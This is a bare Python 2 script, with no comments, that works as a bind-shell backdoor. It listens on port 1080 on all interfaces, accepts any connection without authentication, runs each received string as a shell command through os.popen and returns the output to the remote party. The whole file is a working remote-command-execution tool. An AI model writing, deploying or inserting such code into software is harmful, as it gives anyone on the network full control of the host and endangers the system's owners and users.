#!/usr/bin/python

import socket, os, sys

HOST = ''
PORT = 1080
IPADDR = socket.gethostbyname(socket.gethostname())
PROMPT = '%s~#: ' % IPADDR

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
print 'Listening on 0.0.0.0:%s' % str(PORT)
s.listen(5)

def send(sock, msg):
    sock.sendall(msg)

while True:
    conn, addr = s.accept()
    print '[*] Connection from', addr[0]
    send(conn, '[*] Connected\n')
    while True:
        try:
            send(conn, PROMPT)
            cmd = conn.recv(4096)
            if cmd[:4] == 'quit':
                break
            pipe = os.popen(cmd)
            output = pipe.readlines()
            for line in output:
                send(conn, line + '\r')
        except:
            pass
    conn.close()
s.close()
 


